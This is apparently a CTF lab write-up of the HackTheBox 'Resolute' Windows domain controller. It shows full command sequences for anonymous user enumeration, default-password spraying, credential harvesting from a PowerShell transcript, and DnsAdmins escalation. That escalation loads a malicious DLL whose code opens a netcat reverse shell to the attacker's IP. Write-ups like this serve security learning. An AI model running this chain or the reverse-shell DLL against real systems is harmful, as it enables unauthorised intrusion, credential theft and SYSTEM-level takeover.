---
title: HackTheBox Resolute
author: Marius Kimmina
date: 2020-05-30 14:10:00 +0800
categories: [CTF, HackTheBox]
tags: [Windows, dll injection]
published: true
---

# 0x0 Introduction
This was a medium Windows Box, featuring rpcclient, default Passwords and a dll injection. This one took me quite a bit of time as I am not that used to working with Windows maschines and I learned a lot from this one.
![image](/images/HTB-Resolute.png "Resolute Logo")

# 0x1 getting a foothold

starting, as usual, with a nmap scan

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 09:19 CEST
Nmap scan report for 10.10.10.169
Host is up (0.016s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  tcpwrapped
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-09 07:30:04Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h30m32s, deviation: 4h02m30s, median: 10m32s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-05-09T00:30:09-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-05-09T07:30:10
|_  start_date: 2020-05-09T07:02:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.80 seconds
```

Unusal thing: there is no webserver this time
This seems to be a windows domain controller since it's running kerberos ldap and dns. The first thing I want to get in this case is the domain name, for that I used ldapsearch as follows:

```
$ ldapsearch -x -h 10.10.10.169 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=megabank,DC=local
namingContexts: CN=Configuration,DC=megabank,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local
namingContexts: DC=DomainDnsZones,DC=megabank,DC=local
namingContexts: DC=ForestDnsZones,DC=megabank,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

in the next step I used this domain-name, that we got from the last base namingcontexts, with ldapsearch to get all the information available for this domain

```
$ ldapsearch -x -h 10.10.10.169 -b "DC=megabank,DC=local"
```

the output of this command is way too long to put everything on this blog but it gave us a lot of user names and groups that exist on the box.
We could also use rpcclient to find all the users since it has annonymous authentication enabled. This is an insecure configuration that a lot of Domain Controllers will have if they have been updated from a version older than Windows Server 2016 because Microsoft does not want to break existing environment with updated and some Programs do actually rely on this setting. That being sad tho any new installed Windows Server 2016 or newer will not have this enabled by default.

```
$ rpcclient -U "" -N 10.10.10.169
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

We can user 'queryuser' inside the rpcclient to get more information about individual users, the user marko was very interesting

```
rpcclient $> queryuser marko
        User Name   :   marko
        Full Name   :   Marko Novak
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Account created. Password set to Welcome123!
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Thu, 01 Jan 1970 01:00:00 CET
        Kickoff Time             :      Thu, 14 Sep 30828 04:48:05 CEST
        Password last set Time   :      Fri, 27 Sep 2019 15:17:15 CEST
        Password can change Time :      Sat, 28 Sep 2019 15:17:15 CEST
        Password must change Time:      Thu, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x457
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

This means that 'Welcome123!' is the default password for every new user, First I tried to use it for marko but that did not work. The next step was to try this default Password for all users, which can easily be done using crackmapexec
```
crackmapexec winrm 10.10.10.169 -u userfile -p 'Welcome123!'
```
Which will return the following:
```
WINRM   10.10.10.169    5985    RESOLUTE        [+] MEGABANK\melane:Welcome123! (Pwn3d!)
```
We can use evil-winrm to log in as melanie with this password, thus get a shell on the box and earn the user flag

```
evil-winrm -u melanie -p 'Welcome123!' -i 10.10.10.169

Evil-WinRM shell v2.3

Info: Establising connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents>
```

# 0x2 Escalating Privileges

After looking around the Filesystem for a while, I found Powershell transcript in the *C:\pstranscripts\20191203* directory, the user Ryan specified his credentials in a Command and I was able to view them in plaintext

```
*Evil-WinRM* PS C:\pstranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
[...]
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

This means that we are now able to log in as Ryan:

```
evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents>
```

Ryan is part of DnsAdmin Group, as DnsAdmin we can inject a DLL into the DNS service running on the Domain Controller as SYSTEM. I have crafted a simple DLL which fullfills all requirements for the dns.exe and also executes netcat to give me access to DC as SYSTEM.


```c#
#include "stdafx.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		system("c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.164 9111");
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```
To exploit this we first have to get the netcat.exd and our mallicious dll onto the system, for this used to upload function of evil-winrm:

```
upload /root/htb/resolute/nc.exe
Info: Uploading /root/htb/resolute/nc.exe to C:\windows\system32\spool\drivers\color\nc.exe

Data: 53248 bytes of 53248 bytes copied

Info: Upload successful!
```
and
```
upload /root/htb/resolute/exploit.dll
Info: Uploading /root/htb/resolute/pwn.dll to C:\windows\system32\spool\drivers\color\exploit.dll

Data: 305604 bytes of 305604 bytes copied

Info: Upload successful!
```
Now we are only 3 Commands away from our shell as SYSTEM, first inject the dll into the DNS-Service

```
cmd /c 'dnscmd RESOLUTE /config /serverlevelplugindll C:\Windows\System32\spool\drivers\color\exploit.dll'

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
This dll will be run once the DNS-Service restarts, which we can force as a DnsAdmin with the follwing commands:
```
cmd /c "sc stop dns"
cmd /c "sc start dns"
```

Now all thats left is to use netcat on your host maschine and wait for the incomming connection from the DC

```
nc -lvnp 9111
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9111
Ncat: Listening on 0.0.0.0:9111
Ncat: Connection from 10.10.10.169.
Ncat: Connection from 10.10.10.169:56778.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

# 0x3 Closing Words

This box actually took me forever, the second Windows box I have owned so far and the first time I have ever worked with DLLs. I did learn a lot from it and I personally think this was an awesome box!
